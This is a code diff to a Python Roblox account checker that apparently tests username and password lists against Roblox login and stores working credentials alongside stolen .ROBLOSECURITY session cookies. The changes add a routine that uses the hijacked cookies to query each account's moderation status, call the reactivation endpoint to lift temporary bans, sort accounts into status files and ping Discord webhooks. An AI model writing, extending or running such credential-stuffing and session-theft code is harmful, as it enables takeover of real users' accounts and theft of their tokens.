@@ -22,7 +22,21 @@ LOCKED_WEBHOOK_ENABLED = bool(LOCKED_WEBHOOK)
 TWOFA_WEBHOOK = config.get("twofaWebhook")
 TWOFA_WEBHOOK_ENABLED = bool(TWOFA_WEBHOOK)
 
-if WEBHOOK_ENABLED == True or LOCKED_WEBHOOK_ENABLED == True or TWOFA_WEBHOOK_ENABLED == True:
+TERMED_WEBHOOK = config.get("termedWebhook")
+TERMED_WEBHOOK_ENABLED = bool(TERMED_WEBHOOK)
+TEMP_BANNED_WEBHOOK = config.get("tempBannedWebhook")
+TEMP_BANNED_WEBHOOK_ENABLED = bool(TEMP_BANNED_WEBHOOK)
+REACTIVATED_WEBHOOK = config.get("reactivatedWebhook")
+REACTIVATED_WEBHOOK_ENABLED = bool(REACTIVATED_WEBHOOK)
+
+if (
+    WEBHOOK_ENABLED == True
+    or LOCKED_WEBHOOK_ENABLED == True
+    or TWOFA_WEBHOOK_ENABLED == True
+    or TERMED_WEBHOOK_ENABLED == True
+    or TEMP_BANNED_WEBHOOK_ENABLED == True
+    or REACTIVATED_WEBHOOK_ENABLED == True
+):
     from discord_webhook import DiscordWebhook, DiscordEmbed
 
 if type(WEBHOOK_ENABLED) != bool:
@@ -240,7 +254,7 @@ class Roblox:
 
                     self.account[0] = response.json()["user"]["name"]
 
-                    Output("SUCCESS").log(f"Valid account | {self.account[0]}")
+                    
 
                     cookie_header += f"; .ROBLOSECURITY={response.cookies.get('.ROBLOSECURITY')}"
 
@@ -451,14 +465,14 @@ class Roblox:
                     user_id_and_cookie = self.continue_check(payload)
 
                 if type(user_id_and_cookie) == dict:
-                    Output("SUCCESS").log(f"Valid account | {self.account[0]}")
+                    
 
                     self.handle_multi(user_id_and_cookie)
 
                     self.checked = True
                     continue
 
-                Output("SUCCESS").log(f"Valid account | {self.account[0]}")
+                
 
                 cookie_header += f"; .ROBLOSECURITY={user_id_and_cookie[1]}"
 
@@ -491,7 +505,7 @@ class Roblox:
                             embed = DiscordEmbed(title=f'**Username: {self.account[0]}**', color='FFFF00')
 
                             embed.set_timestamp()
-                            
+
                             webhook.add_embed(embed)
                             webhook.execute()
                         except:
@@ -526,6 +540,26 @@ class Roblox:
         with self.lock.get_lock():
             with open("output/valid.txt", "a", encoding="utf-8") as file:
                 file.write(f'{self.account[0]}:{self.account[1]}:{user_id_and_cookie[1]}\n')
+        status = self.get_account_status(user_id_and_cookie[0], cookie_header)
+
+        if status:
+            Output("STATUS").log(f"Valid account [{status}] | {self.account[0]}")
+
+            with self.lock.get_lock():
+                with open(f"output/{status}.txt", "a", encoding="utf-8") as file:
+                    file.write(f'{self.account[0]}:{self.account[1]}\n')
+
+            if status == "Termed" and TERMED_WEBHOOK_ENABLED:
+                self.send_status_webhook(TERMED_WEBHOOK)
+            elif status == "Temp-Banned" and TEMP_BANNED_WEBHOOK_ENABLED:
+                self.send_status_webhook(TEMP_BANNED_WEBHOOK)
+            elif status == "Reactivated" and REACTIVATED_WEBHOOK_ENABLED:
+                self.send_status_webhook(REACTIVATED_WEBHOOK)
+
+            return
+
+        Output("SUCCESS").log(f"Valid account | {self.account[0]}")
+
 
         self.session.headers = {
             'sec-ch-ua-platform': '"Windows"',
@@ -598,6 +632,76 @@ class Roblox:
             with self.lock.get_lock():
                 with open(f"output/premium/premium_unknown.txt", "a", encoding="utf-8") as file:
                     file.write(f'{self.account[0]}:{self.account[1]}:{user_id_and_cookie[1]}\n')
+
+    def get_account_status(self, user_id, cookie_header) -> str | None:
+        is_termed = False
+        is_banned = False
+        unbanned = False
+
+        temp_session, temp_sec_ch_ua, temp_user_agent, temp_proxy = Session().session()
+
+        temp_session.headers = {
+            'sec-ch-ua': temp_sec_ch_ua,
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-platform': '"Windows"',
+            'user-agent': temp_user_agent,
+            'accept': 'application/json, text/plain, */*'
+        }
+
+        public_user = temp_session.get(f"https://users.roblox.com/v1/users/{user_id}").json()
+
+        is_termed = public_user.get("isBanned") == True
+
+        self.session.headers = {
+            **self.session.headers,
+            'sec-ch-ua-platform': '"Windows"',
+            'sec-ch-ua': self.sec_ch_ua,
+            'sec-ch-ua-mobile': '?0',
+            'user-agent': self.user_agent,
+            'accept': 'application/json, text/plain, */*',
+            'cookie': cookie_header
+        }
+
+        auth_user = self.session.get(f"https://users.roblox.com/v1/users/{user_id}").json()
+
+        if auth_user.get("errors"):
+            is_banned = auth_user["errors"][0]["message"] == "User is moderated"
+
+        csrf = self.session.post("https://auth.roblox.com/v2/logout").headers["x-csrf-token"]
+
+        self.session.headers = {
+            **self.session.headers,
+            "x-csrf-token": csrf
+        }
+
+        if is_banned:
+            reactivate = self.session.post("https://auth.roblox.com/v1/account/reactivate")
+
+            if reactivate.status_code == 200:
+                is_banned = False
+                unbanned = True
+
+        if is_termed:
+            return "Termed"
+        if is_banned:
+            return "Temp-Banned"
+        if unbanned:
+            return "Reactivated"
+
+        return None
+
+    def send_status_webhook(self, webhook_url) -> None:
+        try:
+            webhook = DiscordWebhook(url=webhook_url, content="@here")
+
+            embed = DiscordEmbed(title=f'**Username: {self.account[0]}**', color='FFFF00')
+
+            embed.set_timestamp()
+
+            webhook.add_embed(embed)
+            webhook.execute()
+        except:
+            pass
 
     def handle_multi(self, user_id_and_cookie) -> None:
         multiple_accounts_list = []
